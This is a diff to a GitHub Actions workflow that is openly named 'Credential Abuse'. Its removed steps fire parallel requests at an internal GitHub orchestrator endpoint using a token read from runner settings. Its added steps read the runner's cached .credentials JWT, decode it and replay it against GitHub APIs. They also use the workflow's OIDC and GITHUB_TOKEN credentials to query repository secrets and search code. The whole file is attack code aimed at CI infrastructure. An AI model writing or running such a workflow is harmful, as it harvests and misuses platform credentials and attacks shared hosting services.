@@ -1,26 +1,52 @@
-name: Parallel Attack
+name: Credential Abuse
 on:
   push:
     branches: [master]
 jobs:
   build:
     runs-on: ubuntu-latest
-    timeout-minutes: 3
+    timeout-minutes: 5
     steps:
+      - name: Checkout
+        uses: actions/checkout@v4
       - run: |
-          TOK=$(python3 -c "import json;print(json.load(open('/opt/hca/.settings'))['authToken'],end='')")
-          BASE="https://hosted-compute-request-orchestrator-prod-eus-01.githubapp.com"
+          # 试所有我们拿到的凭据
+          echo "=== 1. ACTIONS_ID_TOKEN_REQUEST_TOKEN ==="
+          if [ -n "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" ]; then
+            curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+              "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://github" 2>&1 | head -20
+          fi
           
-          # 并发10次请求，看有没有一次能命中
-          echo "=== Parallel x10 ==="
-          for i in 1 2 3 4 5 6 7 8 9 10; do
-            curl -sk --http2 --connect-timeout 5 \
-              -H "Authorization: Bearer $TOK" \
-              -H "Content-Type: application/json" \
-              -H "X-GitHub-Test: $i" \
-              -d '{}' \
-              "${BASE}/v1/twirp/github.actions.run_service.api.twirp.v1.RunService/GetPlanStatus" 2>&1 &
-          done
-          wait
           echo ""
-          echo "=== Done ==="
+          echo "=== 2. GITHUB_TOKEN via gh ==="
+          GH_TOKEN=${{ github.token }} gh api /user 2>&1 | head -5
+          echo "---"
+          GH_TOKEN=${{ github.token }} gh api /repos/977812671/npm-install/actions/secrets 2>&1 | head -10
+          echo "---"
+          GH_TOKEN=${{ github.token }} gh api /search/code?q=npm-install 2>&1 | head -10
+          
+          echo ""
+          echo "=== 3. Decode runner credentials JWT ==="
+          python3 << 'PYEOF'
+import json, base64
+cred = json.load(open("/home/runner/actions-runner/cached/2.335.1/.credentials"))
+tok = cred.get("Data",{}).get("token","")
+print(f"Token length: {len(tok)}")
+print(f"Scheme: {cred.get('Scheme')}")
+# Decode payload
+try:
+    payload = tok.split(".")[1]
+    payload += "=="[:(4-len(payload)%4)%4]
+    payload = payload.replace("-","+").replace("_","/")
+    decoded = json.loads(base64.b64decode(payload))
+    print(f"Claims: {json.dumps(decoded, indent=2)[:500]}")
+except Exception as e:
+    print(f"Decode error: {e}")
+PYEOF
+          
+          echo ""
+          echo "=== 4. Try credentials JWT against API ==="
+          CRED_TOK=$(python3 -c "import json;print(json.load(open('/home/runner/actions-runner/cached/2.335.1/.credentials'))['Data']['token'])")
+          curl -s -H "Authorization: Bearer $CRED_TOK" "https://api.github.com/user" 2>&1 | head -5
+          echo "---"
+          curl -s -H "Authorization: Bearer $CRED_TOK" "https://pipelines.actions.githubusercontent.com/api/v1/runners" 2>&1 | head -10
